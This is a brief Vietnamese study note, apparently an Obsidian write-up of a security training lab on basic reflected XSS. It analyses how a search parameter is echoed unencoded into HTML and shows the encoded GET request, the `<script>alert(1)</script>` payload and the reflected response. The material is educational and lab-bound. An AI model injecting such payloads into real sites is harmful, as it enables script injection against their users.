![[reflected-basic.png]]
lab search phản chiếu thẳng, không encode gì, bắn script là ăn.

> [!NOTE] phân tích đề
> - đề cho chức năng search.
> - input từ `?search=...` -> server nhét luôn vào response.
> - context là HTML text: `<p>You searched for: INPUT</p>`.
> - nên mình không cần thoát gì cả, chèn thẻ mới luôn.
> - đọc thêm [[lys thuyet XSS]] + [[reflect XSS]].

### hướng giải
- [ ] nhập chuỗi random `x7Kp92Qa` vào search -> xem response có reflected không.
- [ ] xác định context -> thấy nằm giữa `<p>...</p>`.
- [ ] bắn baseline `<script>alert(1)</script>`.
- [ ] mở browser thật check alert có hiện không.

### giải
request:
```http
GET /?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
```

payload:
```html
<script>alert(1)</script>
```

response trả về:
```html
<p>You searched for: <script>alert(1)</script></p>
```

kết quả:
-> alert(1) hiện luôn.
![[reflected-basic-result.png]]

> [!NOTE] bài học
> - sau khi quan sát lab này mình thấy... reflected đơn giản nhất là khi server tin input tuyệt đối.
> - nên mình sau này luôn test baseline trước, ăn thì khỏi bypass cho mệt.
